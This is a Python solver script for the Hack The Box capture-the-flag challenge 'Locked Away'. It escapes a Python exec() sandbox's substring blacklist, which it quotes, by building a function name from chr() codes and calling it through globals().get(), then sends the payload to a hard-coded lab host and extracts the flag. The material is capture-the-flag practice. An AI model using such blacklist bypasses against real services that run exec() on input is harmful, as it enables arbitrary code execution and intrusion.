#!/usr/bin/env python3
"""HTB 'Locked Away' (misc, easy) solver.

Sandbox: main.py exec()s user input with a substring blacklist:
  import os sys breakpoint flag txt read eval exec dir print subprocess
  [ ] echo cat > < " ' open
The flag is printed by open_chest() (opens 'flag.txt' in cwd /home/ctf).
Bypass: reference the function without spelling 'open', brackets, or quotes
by building the name from chr() codes and using dict.get() on globals():
  globals().get(chr(111)+chr(112)+chr(101)+chr(110)+chr(95)+chr(99)+chr(104)+chr(101)+chr(115)+chr(116))()
== globals().get('open_chest')()
"""
import socket
import sys
import time

HOST = "154.57.164.83"
PORT = 32540

PAYLOAD = (
    "globals().get("
    + "+".join(f"chr({ord(c)})" for c in "open_chest")
    + ")()"
)


def main():
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(10)
    buf = b""
    transcript = []

    # read banner
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        if b"The chest lies waiting..." in buf:
            break
    banner = buf.decode(errors="replace")
    print(banner)
    transcript.append(banner)

    time.sleep(0.3)
    s.sendall(PAYLOAD.encode() + b"\n")

    out = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
    s.close()

    print("--- payload ---")
    print(PAYLOAD)
    print("--- response ---")
    print(out.decode(errors="replace"))
    transcript.append("PAYLOAD> " + PAYLOAD + "\n")
    transcript.append(out.decode(errors="replace"))

    with open("solve/evidence/session.txt", "w", encoding="utf-8") as f:
        f.write("".join(transcript))

    text = out.decode(errors="replace")
    if "HTB{" in text:
        flag = text[text.index("HTB{"):text.index("}", text.index("HTB{")) + 1]
        print("FLAG:", flag)
        return 0
    print("NO FLAG FOUND")
    return 1


if __name__ == "__main__":
    sys.exit(main())
